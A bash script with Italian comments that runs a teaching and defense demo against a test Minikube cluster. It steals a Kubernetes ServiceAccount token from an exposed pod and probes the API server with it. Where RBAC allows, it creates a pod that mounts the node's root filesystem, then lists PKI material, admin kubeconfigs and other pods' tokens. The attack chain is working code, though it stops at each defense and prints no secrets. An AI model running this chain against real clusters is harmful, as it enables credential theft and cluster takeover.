#!/usr/bin/env bash
# =============================================================================
# Attacco dimostrativo A1 - Dal perimetro al token del ServiceAccount
#                           (movimento laterale verso il controllo del cluster)
#
# MODELLO DI ATTACCANTE (vedi security-demos/README.md)
#   - OUTSIDER: nessuna credenziale Kubernetes, nessun accesso al cluster.
#     Parte dalla rete e dalla sola superficie esposta: il reverse proxy
#     'webproxy', unico pod raggiungibile dall'esterno (via l'Ingress). Dietro
#     di esso la prima superficie pre-login e' l'autenticazione (Keycloak/OAuth2).
#   - ZERO-KNOWLEDGE: non sa se le misconfigurazioni ci sono. Le SCOPRE
#     sondando e osservando le risposte. Non assume nulla.
#   - PRIVILEGI MINIMI: a ogni passo usa SOLO cio' che ha verificato di avere.
#     Non si auto-concede ruoli, non crea RoleBinding, non usa credenziali admin.
#     RIGORE: i passi 3-4 agiscono con un kubeconfig ISOLATO la cui UNICA
#     credenziale e' il token rubato (nessun client-cert, nessun fallback al
#     kubeconfig admin dell'operatore). Cosi' l'esperimento ha un controllo
#     valido: senza Excessive RBAC la catena si FERMA davvero al passo 4.
#
# UNICA ASSUNZIONE dichiarata: l'attaccante ha ottenuto esecuzione di codice
# DENTRO il pod esposto, tramite una vulnerabilita' applicativa. Il "come" e'
# FUORI SCOPE (non e' questa la misconfig in esame). Da quel foothold in poi,
# ogni passo e' una SONDA che puo' fallire: se fallisce, la catena si ferma e
# lo script dichiara a quale anello e quale difesa ha retto. Un attacco che si
# ferma non e' un bug della demo: e' la prova che quella difesa funziona.
#
# Misconfig studiata: STRIDE riga 4, "Automounted high-privilege ServiceAccount
# tokens" (+ "Excessive RBAC" come condizione che abilita l'escalation).
# Riferimenti: MITRE ATT&CK T1528 "Steal Application Access Token", T1610
# "Deploy Container"; NSA/CISA Kubernetes Hardening Guidance 1.2; Microsoft
# Threat Matrix for Kubernetes ("Container service account").
#
# NOTA sul chart di questo progetto: il chart CORRETTO monta i SA dedicati con
# automountServiceAccountToken=false, quindi contro di esso questo script si
# ferma gia' al passo 1 (nessun token) -- ed e' il risultato desiderato. Per
# vedere la catena completa serve una variante VULNERABILE del deploy (token
# automontato sul SA 'default' condiviso); vedi la sezione "ambiente vulnerabile".
#
# Laboratorio DIDATTICO e DIFENSIVO su Minikube. Nessuna esfiltrazione, nessuna
# chiave stampata (solo la PROVA d'accesso: 'ls'/conteggi). Eseguire SOLO sul
# proprio cluster di prova.
#
# Uso:
#   ./04-attacco-token-lateral-movement.sh [namespace]        # attacco (sole sonde + azioni consentite)
#   SIMULA_RBAC_ECCESSIVO=1 ./04-...                          # prepara una condizione vulnerabile (NON e' un'azione dell'attaccante)
# =============================================================================
set -euo pipefail

NS="${1:-smartgrid}"
SIMULA_RBAC_ECCESSIVO="${SIMULA_RBAC_ECCESSIVO:-0}"
ATK_POD="attacker-hostpath"
VULN_ROLE="lab-excessive-rbac-createpods"       # modella una misconfig "Excessive RBAC"
VULN_BIND="lab-excessive-rbac-createpods-binding"
BUSYBOX_IMAGE="${BUSYBOX_IMAGE:-busybox:1.36}"
TOKEN_PATH="/var/run/secrets/kubernetes.io/serviceaccount/token"
ATK_KUBECONFIG=""                               # kubeconfig isolato col solo token rubato

line() { printf '\n=== %s\n' "$1"; }
stop() { printf '\n>>> CATENA FERMATA (%s): %s\n' "$1" "$2"; }
need() { command -v "$1" >/dev/null || { echo "serve '$1' nel PATH"; exit 1; }; }
b64pad() { local s="$1"; while [ $(( ${#s} % 4 )) -ne 0 ]; do s="${s}="; done; printf '%s' "$s"; }

# Costruisce un kubeconfig che autentica SOLO col token rubato (parametro $1).
# Endpoint e CA sono quelli del cluster: dentro al pod l'attaccante li ha gia' nel
# mount del SA; qui li rileggiamo dal kubeconfig esistente in sola lettura, ma la
# sola CREDENZIALE scritta e' il token -> impossibile ripiegare sull'identita' admin.
build_attacker_kubeconfig() {
  local tok="$1" server ca_data ca_file
  server="$(kubectl config view --minify -o jsonpath='{.clusters[0].cluster.server}' 2>/dev/null || true)"
  ca_data="$(kubectl config view --raw --minify -o jsonpath='{.clusters[0].cluster.certificate-authority-data}' 2>/dev/null || true)"
  if [ -z "$ca_data" ]; then
    ca_file="$(kubectl config view --raw --minify -o jsonpath='{.clusters[0].cluster.certificate-authority}' 2>/dev/null || true)"
    [ -n "$ca_file" ] && [ -f "$ca_file" ] && ca_data="$(base64 "$ca_file" 2>/dev/null | tr -d '\n')"
  fi
  ATK_KUBECONFIG="$(mktemp)"
  {
    echo "apiVersion: v1"
    echo "kind: Config"
    echo "clusters:"
    echo "- name: lab"
    echo "  cluster:"
    echo "    server: ${server:-https://kubernetes.default.svc}"
    if [ -n "$ca_data" ]; then echo "    certificate-authority-data: $ca_data"
    else                       echo "    insecure-skip-tls-verify: true"; fi
    echo "contexts:"
    echo "- name: stolen"
    echo "  context: { cluster: lab, user: stolen-sa }"
    echo "current-context: stolen"
    echo "users:"
    echo "- name: stolen-sa"
    echo "  user:"
    echo "    token: ${tok}"
  } > "$ATK_KUBECONFIG"
}

need kubectl
kubectl get ns "$NS" >/dev/null || { echo "namespace '$NS' non trovato"; exit 1; }

# -- pulizia: rimuove solo cio' che questo script potrebbe aver creato --------
cleanup() {
  set +e
  kubectl delete pod "$ATK_POD" -n "$NS" --ignore-not-found --grace-period=0 >/dev/null 2>&1
  [ -n "$ATK_KUBECONFIG" ] && rm -f "$ATK_KUBECONFIG" >/dev/null 2>&1
  if [ "$SIMULA_RBAC_ECCESSIVO" = "1" ]; then
    kubectl delete rolebinding "$VULN_BIND" -n "$NS" --ignore-not-found >/dev/null 2>&1
    kubectl delete role "$VULN_ROLE" -n "$NS" --ignore-not-found >/dev/null 2>&1
  fi
  echo "(pulizia completata)"
}
trap cleanup EXIT

# -----------------------------------------------------------------------------
# (opzionale) PREPARAZIONE DELL'AMBIENTE VULNERABILE -- NON e' un'azione
# dell'attaccante: modella un cluster mal configurato (SA condiviso con troppi
# permessi, "Excessive RBAC"). Serve solo per mostrare in laboratorio fin dove
# arriverebbe la catena su un deploy vulnerabile. L'attaccante NON ha mai questo
# potere: lo trova gia' nell'ambiente, oppure non lo trova e la catena si ferma.
# -----------------------------------------------------------------------------
if [ "$SIMULA_RBAC_ECCESSIVO" = "1" ]; then
  line "[AMBIENTE] Modello una misconfig 'Excessive RBAC' sul SA 'default' (non e' l'attaccante)"
  kubectl create role "$VULN_ROLE" -n "$NS" --verb=create,get,list --resource=pods \
    --dry-run=client -o yaml | kubectl apply -f - >/dev/null
  kubectl create rolebinding "$VULN_BIND" -n "$NS" \
    --role="$VULN_ROLE" --serviceaccount="${NS}:default" \
    --dry-run=client -o yaml | kubectl apply -f - >/dev/null
  echo "   fatto: nel namespace '$NS' il SA 'default' ora puo' creare pod (condizione vulnerabile)."
fi

echo "MODELLO: attaccante OUTSIDER, ZERO-KNOWLEDGE, PRIVILEGI MINIMI."
echo "INGRESSO (stage 0): l'outsider ottiene il foothold sfruttando una vulnerabilita'"
echo "applicativa sul servizio esposto (MITRE T1190 'Exploit Public-Facing Application')."
echo "In laboratorio questo stage e' RAPPRESENTATO con 'kubectl exec' nel pod esposto; la"
echo "classe di vulnerabilita', il CVE di riferimento (Log4Shell, CVE-2021-44228) e i passi"
echo "di riproduzione sono descritti in security-demos/README.md."

# -----------------------------------------------------------------------------
# 0. Foothold: il pod esposto da cui l'attaccante esegue codice
# -----------------------------------------------------------------------------
# Il webproxy (reverse proxy) e' l'unico pod esposto all'esterno (via Ingress):
# e' il foothold realistico per un outsider. Fallback: openPDC, poi primo pod.
POD="$(kubectl get pods -n "$NS" -l app=webproxy -o name 2>/dev/null | head -n1)"
[ -n "$POD" ] || POD="$(kubectl get pods -n "$NS" -l smartgrid.io/role=openpdc -o name 2>/dev/null | head -n1)"
[ -n "$POD" ] || POD="$(kubectl get pods -n "$NS" -o name | head -n1)"
[ -n "$POD" ] || { echo "nessun pod nel namespace '$NS'"; exit 1; }
POD="${POD#pod/}"
line "0. Ingresso (T1190): foothold nel pod esposto (rappresentato in lab): $POD"

# -----------------------------------------------------------------------------
# 1. SONDA (zero-knowledge): esiste un token da rubare in questo pod?
#    Non lo assumiamo: lo verifichiamo. (misconfig 1)
# -----------------------------------------------------------------------------
line "1. Sonda: c'e' un token di ServiceAccount montato nel pod? (misconfig 1)"
if ! kubectl exec -n "$NS" "$POD" -- ls "$TOKEN_PATH" >/dev/null 2>&1; then
  stop "passo 1" "nessun token montato nel pod (automountServiceAccountToken=false)."
  echo "    E' la difesa principale e a costo zero: senza token l'attaccante non ha nulla"
  echo "    da riutilizzare contro l'API. Nel chart corretto di questo progetto e' cosi'."
  echo; echo "RISULTATO: misconfig 1 ASSENTE -> la catena non parte."
  exit 0
fi
echo "   token presente: il pod monta un token di ServiceAccount (misconfig 1 presente)."
kubectl get pod "$POD" -n "$NS" \
  -o custom-columns='POD:.metadata.name,SA:.spec.serviceAccountName,AUTOMOUNT:.spec.automountServiceAccountToken' 2>/dev/null || true

# -----------------------------------------------------------------------------
# 2. SONDA: l'attaccante legge il token (T1528) e verifica se dal pod si
#    raggiunge l'API server. Non assume che l'egress sia aperto: lo prova.
# -----------------------------------------------------------------------------
line "2. L'attaccante legge il token e SONDA l'API server dal pod (T1528)"
TOKEN="$(kubectl exec -n "$NS" "$POD" -- cat "$TOKEN_PATH" 2>/dev/null || true)"
if [ -z "$TOKEN" ]; then
  stop "passo 2" "token non leggibile."; exit 0
fi
echo "-- identita' nel token (claim 'sub' del JWT; nessun valore segreto):"
PAYLOAD="$(printf '%s' "$TOKEN" | cut -d. -f2 | tr '_-' '/+')"
b64pad "$PAYLOAD" | base64 -d 2>/dev/null | tr ',' '\n' \
  | grep -E '"sub"|"namespace"|"serviceaccount"' || echo "   (payload non decodificabile qui; non e' importante)"

# da qui in poi l'attaccante agisce con un kubeconfig che usa SOLO questo token
build_attacker_kubeconfig "$TOKEN"

echo "-- l'API server e' raggiungibile DAL POD? (egress non filtrato = misconfig abilitante)"
API_CODE="$(kubectl exec -n "$NS" "$POD" -- sh -c '
  T=$(cat '"$TOKEN_PATH"' 2>/dev/null)
  wget -q -O /dev/null -S --no-check-certificate --timeout=5 \
    --header="Authorization: Bearer $T" \
    "https://kubernetes.default.svc/api/v1/namespaces/'"$NS"'/pods" 2>&1 \
    | awk "/HTTP\//{print \$2; exit}"
' 2>/dev/null || true)"
case "${API_CODE:-}" in
  200) echo "   HTTP 200: il token raggiunge l'API e puo' LEGGERE i pod del namespace." ;;
  403) echo "   HTTP 403: API raggiungibile e token valido, ma questa identita' non e' autorizzata a quell'azione." ;;
  "")  stop "passo 2" "l'API non e' raggiungibile dal pod (egress filtrato / timeout)."
       echo "    Una NetworkPolicy di egress che permette solo il DNS taglia qui la catena"
       echo "    'pod compromesso -> API server', anche con un token valido in mano."
       echo; echo "RISULTATO: catena fermata al passo 2 (egress chiuso)."; exit 0 ;;
  *)   echo "   HTTP ${API_CODE}: risposta inattesa (immagine senza wget?); procedo con cautela." ;;
esac

# -----------------------------------------------------------------------------
# 3. L'attaccante ENUMERA i permessi REALI del token e usa SOLO quelli.
#    Niente auto-concessione di ruoli: cio' che non c'e', non lo prende.
# -----------------------------------------------------------------------------
line "3. Permessi REALI dell'identita' rubata (RBAC effettivo, nessun over-grant preso)"
echo "-- cosa puo' fare, oggi, questo token (kubeconfig isolato, solo-token):"
kubectl --kubeconfig "$ATK_KUBECONFIG" auth can-i --list -n "$NS" 2>/dev/null | head -n 15 || \
  echo "   (enumerazione non disponibile da qui)"

# -----------------------------------------------------------------------------
# 4. Escalation CONDIZIONATA: l'attaccante PROVA l'azione pericolosa col solo
#    token. Riesce solo se il RBAC reale lo consente (Excessive RBAC). Altrimenti
#    la catena si ferma -- ed e' la prova che il minimo privilegio regge.
# -----------------------------------------------------------------------------
line "4. Prova (col solo token) a creare un pod che monti il filesystem del nodo (T1610)"
if ! kubectl --kubeconfig "$ATK_KUBECONFIG" auth can-i create pods -n "$NS" >/dev/null 2>&1; then
  stop "passo 4" "l'identita' rubata NON puo' creare pod (RBAC a minimo privilegio)."
  echo "    Senza 'create pods' la catena verso il nodo e il control plane non prosegue."
  echo "    (Per vedere il seguito su un cluster vulnerabile: SIMULA_RBAC_ECCESSIVO=1.)"
  echo; echo "RISULTATO: catena fermata al passo 4 (nessun Excessive RBAC)."
else
  echo "   => l'identita' PUO' creare pod: condizione 'Excessive RBAC' presente. Proseguo."
  echo "-- creo (col solo token rubato) un pod che monta hostPath / in sola lettura:"
  kubectl --kubeconfig "$ATK_KUBECONFIG" apply -f - <<EOF >/dev/null
apiVersion: v1
kind: Pod
metadata:
  name: $ATK_POD
  namespace: $NS
  labels: { app.kubernetes.io/name: attacco-token-lab }
spec:
  automountServiceAccountToken: false
  terminationGracePeriodSeconds: 0
  containers:
  - name: probe
    image: $BUSYBOX_IMAGE
    imagePullPolicy: IfNotPresent
    command: ["sh","-c","sleep 120"]
    volumeMounts: [ { name: host, mountPath: /host, readOnly: true } ]
  volumes:
  - { name: host, hostPath: { path: / } }
EOF
  kubectl wait pod "$ATK_POD" -n "$NS" --for=condition=Ready --timeout=90s >/dev/null 2>&1 || true
  NODE="$(kubectl get pod "$ATK_POD" -n "$NS" -o jsonpath='{.spec.nodeName}' 2>/dev/null || true)"
  echo "   pod schedulato sul nodo: ${NODE:-?}"
  echo "-- OSSERVAZIONE DI LABORATORIO dell'impatto (solo 'ls'/conteggi, nessuna chiave"
  echo "   stampata). L'AZIONE D'ATTACCO sotto esame e' la creazione del pod col token;"
  echo "   qui il laboratorio ispeziona cosa quel pod monta dal nodo:"
  kubectl exec -n "$NS" "$ATK_POD" -- sh -c '
    found=0
    for d in /host/etc/kubernetes/pki /host/var/lib/minikube/certs; do
      [ -d "$d" ] && { echo "   materiale crittografico leggibile in $d:"; ls -1 "$d" 2>/dev/null | sed "s/^/     /" | head; found=1; }
    done
    for f in /host/etc/kubernetes/admin.conf /host/etc/kubernetes/super-admin.conf; do
      [ -f "$f" ] && { echo "   kubeconfig admin leggibile: $f  (= cluster-admin)"; found=1; }
    done
    [ "$found" = 0 ] && echo "   (percorsi del control plane non trovati su questo nodo: il pod NON gira sul control plane)"
    n=$(find /host/var/lib/kubelet/pods -name token 2>/dev/null | wc -l)
    echo "   token di altri pod raggiungibili sul nodo: $n"
  ' || true
  echo "   => se il pod gira sul control plane (misconfig 2), l'attaccante legge CA e"
  echo "      kubeconfig admin: dal pod esposto al controllo del cluster."
  kubectl delete pod "$ATK_POD" -n "$NS" --grace-period=0 >/dev/null 2>&1 || true
fi

echo
echo "RIEPILOGO: l'attaccante outsider arriva solo fin dove la configurazione reale"
echo "glielo consente. Ogni anello e' una misconfig: token automontato (1), egress"
echo "aperto, Excessive RBAC, pod sul control plane (2). Togline uno spezza la catena."
echo "Contromisure complete: README e security-demos/README.md, sez. 1."
